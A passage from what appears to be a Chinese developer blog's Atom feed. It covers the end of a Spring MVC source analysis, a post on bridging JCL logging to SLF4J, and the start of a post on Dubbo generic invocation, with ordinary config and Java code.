java.lang.Long&quot; -&gt; &quot;java.util.Date -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$DateToLongConverter@a178d09,java.util.Date -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$DateToLongConverter@551d27e0&quot;</span><br><span class="line">     67 = &#123;LinkedHashMap$Entry@6664&#125; &quot;java.util.Date -&gt; java.util.Calendar&quot; -&gt; &quot;java.util.Date -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$DateToCalendarConverter@2bd20c9a,java.util.Date -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$DateToCalendarConverter@1c6b5a31&quot;</span><br><span class="line">     68 = &#123;LinkedHashMap$Entry@6665&#125; &quot;java.util.Calendar -&gt; java.util.Date&quot; -&gt; &quot;java.util.Calendar -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToDateConverter@2aa2f370,java.util.Calendar -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToDateConverter@163cf3e3&quot;</span><br><span class="line">     69 = &#123;LinkedHashMap$Entry@6666&#125; &quot;java.util.Calendar -&gt; java.lang.Long&quot; -&gt; &quot;java.util.Calendar -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToLongConverter@2db18b62,java.util.Calendar -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToLongConverter@6bcdf637&quot;</span><br><span class="line">     70 = &#123;LinkedHashMap$Entry@6667&#125; &quot;java.lang.Long -&gt; java.util.Date&quot; -&gt; &quot;java.lang.Long -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$LongToDateConverter@56c9b14d,java.lang.Long -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$LongToDateConverter@271bf39c&quot;</span><br><span class="line">     71 = &#123;LinkedHashMap$Entry@6668&#125; &quot;java.lang.Long -&gt; java.util.Calendar&quot; -&gt; &quot;java.lang.Long -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$LongToCalendarConverter@6d08686,java.lang.Long -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$LongToCalendarConverter@2a8b425&quot;</span><br><span class="line">     72 = &#123;LinkedHashMap$Entry@6669&#125; &quot;java.time.LocalDateTime -&gt; java.time.LocalDate&quot; -&gt; &quot;java.time.LocalDateTime -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$LocalDateTimeToLocalDateConverter@19f02ee4&quot;</span><br><span class="line">     73 = &#123;LinkedHashMap$Entry@6670&#125; &quot;java.time.LocalDateTime -&gt; java.time.LocalTime&quot; -&gt; &quot;java.time.LocalDateTime -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$LocalDateTimeToLocalTimeConverter@618fb955&quot;</span><br><span class="line">     74 = &#123;LinkedHashMap$Entry@6671&#125; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDate&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToLocalDateConverter@63e9f754&quot;</span><br><span class="line">     75 = &#123;LinkedHashMap$Entry@6672&#125; &quot;java.time.ZonedDateTime -&gt; java.time.LocalTime&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToLocalTimeConverter@24a76e90&quot;</span><br><span class="line">     76 = &#123;LinkedHashMap$Entry@6673&#125; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDateTime : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToLocalDateTimeConverter@3cb8e3ee&quot;</span><br><span class="line">     77 = &#123;LinkedHashMap$Entry@6674&#125; &quot;java.time.ZonedDateTime -&gt; java.time.OffsetDateTime&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.OffsetDateTime : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToOffsetDateTimeConverter@2061a03d&quot;</span><br><span class="line">     78 = &#123;LinkedHashMap$Entry@6675&#125; &quot;java.time.ZonedDateTime -&gt; java.time.Instant&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToInstantConverter@c1ea032&quot;</span><br><span class="line">     79 = &#123;LinkedHashMap$Entry@6676&#125; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDate&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToLocalDateConverter@13d29ccf&quot;</span><br><span class="line">     80 = &#123;LinkedHashMap$Entry@6677&#125; &quot;java.time.OffsetDateTime -&gt; java.time.LocalTime&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToLocalTimeConverter@680eaac8&quot;</span><br><span class="line">     81 = &#123;LinkedHashMap$Entry@6678&#125; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDateTime : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToLocalDateTimeConverter@45438fbc&quot;</span><br><span class="line">     82 = &#123;LinkedHashMap$Entry@6679&#125; &quot;java.time.OffsetDateTime -&gt; java.time.ZonedDateTime&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.ZonedDateTime : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToZonedDateTimeConverter@3ca5a816&quot;</span><br><span class="line">     83 = &#123;LinkedHashMap$Entry@6680&#125; &quot;java.time.OffsetDateTime -&gt; java.time.Instant&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToInstantConverter@3b166fa9&quot;</span><br><span class="line">     84 = &#123;LinkedHashMap$Entry@6681&#125; &quot;java.util.Calendar -&gt; java.time.ZonedDateTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.ZonedDateTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToZonedDateTimeConverter@2653dae9&quot;</span><br><span class="line">     85 = &#123;LinkedHashMap$Entry@6682&#125; &quot;java.util.Calendar -&gt; java.time.OffsetDateTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.OffsetDateTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToOffsetDateTimeConverter@7f348ff0&quot;</span><br><span class="line">     86 = &#123;LinkedHashMap$Entry@6683&#125; &quot;java.util.Calendar -&gt; java.time.LocalDate&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToLocalDateConverter@6e407d18&quot;</span><br><span class="line">     87 = &#123;LinkedHashMap$Entry@6684&#125; &quot;java.util.Calendar -&gt; java.time.LocalTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToLocalTimeConverter@66a32c5e&quot;</span><br><span class="line">     88 = &#123;LinkedHashMap$Entry@6685&#125; &quot;java.util.Calendar -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.LocalDateTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToLocalDateTimeConverter@5e9f36f1&quot;</span><br><span class="line">     89 = &#123;LinkedHashMap$Entry@6686&#125; &quot;java.util.Calendar -&gt; java.time.Instant&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToInstantConverter@50f69dd&quot;</span><br><span class="line">     90 = &#123;LinkedHashMap$Entry@6687&#125; &quot;java.lang.Long -&gt; java.time.Instant&quot; -&gt; &quot;java.lang.Long -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$LongToInstantConverter@684a7cd9&quot;</span><br><span class="line">     91 = &#123;LinkedHashMap$Entry@6688&#125; &quot;java.time.Instant -&gt; java.lang.Long&quot; -&gt; &quot;java.time.Instant -&gt; java.lang.Long : org.springframework.format.datetime.standard.DateTimeConverters$InstantToLongConverter@17f47c52&quot;</span><br><span class="line">     92 = &#123;LinkedHashMap$Entry@6689&#125; &quot;java.time.LocalDate -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.LocalDate -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDate -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@4ec42ea0&quot;</span><br><span class="line">     93 = &#123;LinkedHashMap$Entry@6690&#125; &quot;java.lang.String -&gt; java.time.LocalDate&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.LocalDate: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.LocalDate: org.springframework.format.datetime.standard.TemporalAccessorParser@75d32f15&quot;</span><br><span class="line">     94 = &#123;LinkedHashMap$Entry@6691&#125; &quot;java.time.LocalTime -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.LocalTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@41f1db11&quot;</span><br><span class="line">     95 = &#123;LinkedHashMap$Entry@6692&#125; &quot;java.lang.String -&gt; java.time.LocalTime&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.LocalTime: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.LocalTime: org.springframework.format.datetime.standard.TemporalAccessorParser@2ea20f2c&quot;</span><br><span class="line">     96 = &#123;LinkedHashMap$Entry@6693&#125; &quot;java.time.LocalDateTime -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@41fc9576&quot;</span><br><span class="line">     97 = &#123;LinkedHashMap$Entry@6694&#125; &quot;java.lang.String -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.LocalDateTime: org.springframework.format.datetime.standard.TemporalAccessorParser@2dbba1db&quot;</span><br><span class="line">     98 = &#123;LinkedHashMap$Entry@6695&#125; &quot;java.time.ZonedDateTime -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.ZonedDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.ZonedDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@625dde2e&quot;</span><br><span class="line">     99 = &#123;LinkedHashMap$Entry@6696&#125; &quot;java.lang.String -&gt; java.time.ZonedDateTime&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.ZonedDateTime: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.ZonedDateTime: org.springframework.format.datetime.standard.TemporalAccessorParser@5cb87626&quot;</span><br><span class="line">   converterCache = &#123;ConcurrentReferenceHashMap@6591&#125;  size = 1</span><br><span class="line">    0 = &#123;ConcurrentReferenceHashMap$Entry@7099&#125; &quot;ConverterCacheKey [sourceType = java.lang.String, targetType = @org.springframework.web.bind.annotation.RequestParam java.lang.String]&quot; -&gt; &quot;NO_OP&quot;</span><br><span class="line">  propertyEditorRegistrars = null</span><br></pre></td></tr></table></figure><h3 id="parameterNameDiscoverer"><a href="#parameterNameDiscoverer" class="headerlink" title="parameterNameDiscoverer"></a>parameterNameDiscoverer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this.parameterNameDiscoverer = &#123;DefaultParameterNameDiscoverer@4866&#125; </span><br><span class="line"> parameterNameDiscoverers = &#123;LinkedList@7309&#125;  size = 2</span><br><span class="line">  0 = &#123;StandardReflectionParameterNameDiscoverer@7311&#125; </span><br><span class="line">  1 = &#123;LocalVariableTableParameterNameDiscoverer@7312&#125;</span><br></pre></td></tr></table></figure><p>容器的启动过程以及一次请求的详细处理过程: <a href="springmvc.log">启动日志</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;启动流程的分析见: &lt;a href=&quot;/2016/10/02/spring-mvc/&quot; title=&quot;Spring Mvc源码剖析(一)&quot;&gt;Spring Mvc源码剖析(一)&lt;/a&gt;&lt;/p&gt;
&lt;img src=&quot;/2018/05/06/spring-mvc-2/spring
      
    
    </summary>
    
      <category term="spring" scheme="http://qsli.github.io/categories/spring/"/>
    
    
      <category term="spring mvc" scheme="http://qsli.github.io/tags/spring-mvc/"/>
    
  </entry>
  
  <entry>
    <title>将其他日志框架桥接到slf4j</title>
    <link href="http://qsli.github.io/2018/05/05/slf4j-bridge/"/>
    <id>http://qsli.github.io/2018/05/05/slf4j-bridge/</id>
    <published>2018-05-05T08:14:59.000Z</published>
    <updated>2018-08-11T12:42:42.567Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SLF4J"><a href="#SLF4J" class="headerlink" title="SLF4J"></a>SLF4J</h2><p>java世界的日志框架太多了, <code>Jakarta Commons Logging (JCL)</code>,  java.util.logging (jul), Log4j, Logback等等. 其中 log4j和logback是同一个作者写的, 这个作者为了统一日志的API, 又创作了SLF4J, SLF4J采用门面模式定义了日志操作的API, 但是并没有提供实现,<br>具体的实现由用户引入的jar包决定, 比如Log4j或者Logback等.</p><p>为了能让之前的项目, 比如一个比较古老的项目使用了 JCL, 也能使用<code>SLF4J</code>带来的好处(接口和实现分离), 就出现了桥接的需求.</p><p> <img src="https://www.slf4j.org/images/legacy.png" alt=""></p><p> 一旦桥接到了<code>SLF4J</code>, 底层的日志实现就可以随便选了.</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p> 这里拿<code>JCL</code>为例, 介绍下如何使用桥接包.</p><ol><li>exclude掉<code>JCL</code>对应的jar包</li><li>引入<code>jcl-over-slf4j</code></li></ol><p>比如拿<code>spring mvc</code>为例, 他内部使用的是<code>JCL</code>作为日志实现, 我们需要做的就是:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--exclude--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;sl4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.slf4j/jcl-over-slf4j --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcl-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>桥接的实现原理就是不引入<code>JCL</code>等之前包的实现, 在桥接的jar包中实现一套相同的api.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  jcl-over-slf4j-1.7.25-sources  tree</span><br><span class="line">.</span><br><span class="line">├── META-INF</span><br><span class="line">│   ├── MANIFEST.MF</span><br><span class="line">│   └── services</span><br><span class="line">│       └── org.apache.commons.logging.LogFactory</span><br><span class="line">└── org</span><br><span class="line">    └── apache</span><br><span class="line">        └── commons</span><br><span class="line">            └── logging</span><br><span class="line">                ├── impl</span><br><span class="line">                │   ├── NoOpLog.java</span><br><span class="line">                │   ├── package.html</span><br><span class="line">                │   ├── SimpleLog.java</span><br><span class="line">                │   ├── SLF4JLocationAwareLog.java</span><br><span class="line">                │   ├── SLF4JLogFactory.java</span><br><span class="line">                │   └── SLF4JLog.java</span><br><span class="line">                ├── LogConfigurationException.java</span><br><span class="line">                ├── LogFactory.java</span><br><span class="line">                ├── Log.java</span><br><span class="line">                └── package.html</span><br></pre></td></tr></table></figure><p>在<code>LogFactory</code>中使用的是<code>SLF4JLogFactory</code>来获取<code>Logger</code>, 最终用到的是<code>slf4j-api</code>中定义的方法.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.commons.logging.LogFactory</span></span><br><span class="line"><span class="keyword">static</span> LogFactory logFactory = <span class="keyword">new</span> SLF4JLogFactory();</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.commons.logging.impl.SLF4JLogFactory#getInstance(java.lang.String)</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Log <span class="title">getInstance</span><span class="params">(String name)</span> <span class="keyword">throws</span> LogConfigurationException </span>&#123;</span><br><span class="line">        Log instance = loggerMap.get(name);</span><br><span class="line">        <span class="keyword">if</span> (instance != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> instance;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Log newInstance;</span><br><span class="line">            Logger slf4jLogger = LoggerFactory.getLogger(name);</span><br><span class="line">            <span class="keyword">if</span> (slf4jLogger <span class="keyword">instanceof</span> LocationAwareLogger) &#123;</span><br><span class="line">                newInstance = <span class="keyword">new</span> SLF4JLocationAwareLog((LocationAwareLogger) slf4jLogger);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                newInstance = <span class="keyword">new</span> SLF4JLog(slf4jLogger);</span><br><span class="line">            &#125;</span><br><span class="line">            Log oldInstance = loggerMap.putIfAbsent(name, newInstance);</span><br><span class="line">            <span class="keyword">return</span> oldInstance == <span class="keyword">null</span> ? newInstance : oldInstance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.slf4j.org/legacy.html" rel="external nofollow noopener noreferrer" target="_blank">Log4j Bridge</a></li><li><a href="https://zhuanlan.zhihu.com/p/24272450" rel="external nofollow noopener noreferrer" target="_blank">Java 日志框架解析(上) - 历史演进</a></li><li><a href="https://zhuanlan.zhihu.com/p/24275518" rel="external nofollow noopener noreferrer" target="_blank">Java 日志框架解析(下) - 最佳实践</a></li><li><a href="http://tech.lede.com/2017/02/06/rd/server/log4jSearch/index.html" rel="external nofollow noopener noreferrer" target="_blank">日志工具现状调研 | 网易乐得技术团队</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SLF4J&quot;&gt;&lt;a href=&quot;#SLF4J&quot; class=&quot;headerlink&quot; title=&quot;SLF4J&quot;&gt;&lt;/a&gt;SLF4J&lt;/h2&gt;&lt;p&gt;java世界的日志框架太多了, &lt;code&gt;Jakarta Commons Logging (JCL)&lt;/code&gt;
      
    
    </summary>
    
      <category term="java" scheme="http://qsli.github.io/categories/java/"/>
    
    
      <category term="logback" scheme="http://qsli.github.io/tags/logback/"/>
    
  </entry>
  
  <entry>
    <title>dubbo泛化调用原理</title>
    <link href="http://qsli.github.io/2018/05/02/dubbo-generic-invoke/"/>
    <id>http://qsli.github.io/2018/05/02/dubbo-generic-invoke/</id>
    <published>2018-05-02T12:50:44.000Z</published>
    <updated>2018-08-11T12:42:41.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>泛接口调用方式主要用于客户端没有API接口及模型类元的情况，参数及返回值中的所有POJO均用Map表示，通常用于框架集成，比如：实现一个通用的服务测试框架，可通过GenericService调用所有服务实现。</p></blockquote><p>截图为qunar的dubbo服务测试框架, 只需将参数按照指定的格式填入, 就可以直接调用相应的dubbo接口.</p><img src="/2018/05/02/dubbo-generic-invoke/generic.png" title="通过泛化调用手工发起dubbo请求"><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>泛化调用需要接口声明为泛化, 可以在声明接口的时候指定,</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">id</span>=<span class="string">"barService"</span> <span class="attr">interface</span>=<span class="string">"com.foo.BarService"</span> <span class="attr">generic</span>=<span class="string">"true"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>也可以在代码中进行设置:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ReferenceConfig&lt;GenericService&gt; reference = <span class="keyword">new</span> ReferenceConfig&lt;GenericService&gt;();</span><br><span class="line">reference.setApplication(<span class="keyword">new</span> ApplicationConfig(<span class="string">"generic-consumer"</span>));</span><br><span class="line">reference.setInterface(DemoService.class);</span><br><span class="line">reference.setUrl(<span class="string">"dubbo://127.0.0.1:29581?scope=remote"</span>);</span><br><span class="line"><span class="comment">// 声明为泛化</span></span><br><span class="line">reference.setGeneric(<span class="keyword">true</span>);</span><br><span class="line">GenericService genericService = reference.get();</span><br></pre></td></tr></table></figure><p>然后就可以使用泛化调用的方式去调用接口了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Map&lt;String, Object&gt;&gt; users = <span class="keyword">new</span> ArrayList&lt;Map&lt;String, Object&gt;&gt;();</span><br><span class="line">Map&lt;String, Object&gt; user = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">user.put(<span class="string">"class"</span>, <span class="string">"com.alibaba.dubbo.config.api.User"</span>);</span><br><span class="line">user.put(<span class="string">"name"</span>, <span class="string">"actual.provider"</span>);</span><br><span class="line">users.add(user);</span><br><span class="line"><span class="comment">// 泛化调用</span></span><br><span class="line">users = (List&lt;Map&lt;String, Object&gt;&gt;) genericService.$invoke(<span class="string">"getUsers"</span>, <span class="keyword">new</span> String[] &#123;List.class.getName()&#125;, <span class="keyword">new</span> Object[] &#123;users&#125;);</span><br><span class="line">Assert.assertEquals(<span class="number">1</span>, users.size());</span><br><span class="line">Assert.assertEquals(<span class="string">"actual.provider"</span>, users.get(<span class="number">0</span>).get(<span class="string">"name"</span>));</span><br></pre></td></tr></table></figure><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>泛化调用是通过dubbo的filter机制实现的, 大概流程如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">+-------------------------------------------+               +-------------------------------------------+</span><br><span class="line">|  consumer 端                               |               | provider 端                                |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                    +------------------+   |               |       +--------------+                    |</span><br><span class="line">|                    |GenericImplFilter |   |  Invocation   |       |GenericFilter |                    |</span><br><span class="line">|             +----&gt; |                  +-------------------------&gt; |              |                    |</span><br><span class="line">|             |      +------------------+   |               |       +--------------+                    |</span><br><span class="line">| +-----------+                             |               |                      |    +-----------+   |</span><br><span class="line">| |           |                             |               |                      |    |           |   |</span><br><span class="line">| |Client     |                             |               |                      +--&gt; | Service   |   |</span><br><span class="line">| |           |                             |               |                           |           |   |</span><br><span class="line">| +-----------+                             |               |                           +-------+---+   |</span><br><span class="line">|                                           |               |                                   |       |</span><br><span class="line">|      ^             +------------------+   |               |       +--------------+            |       |</span><br><span class="line">|      |             |GenericImplFilter |   |               |       |GenericFilter | &lt;----------+       |</span><br><span class="line">|      +-------------+                  | &lt;-------------------------+              |                    |</span><br><span class="line">|                    +------------------+   |               |       +--------------+                    |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">+-------------------------------------------+               +-------------------------------------------+</span><br></pre></td></tr></table></figure><h3 id="GenericService"><a href="#GenericService" class="headerlink" title="GenericService"></a>GenericService</h3><p><code>GenericService</code>这个接口和java的反射调用非常像, 只需提供调用的方法名称,  参数的类型以及参数的值就可以直接调用对应方法了.</p><p>接口的实现如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 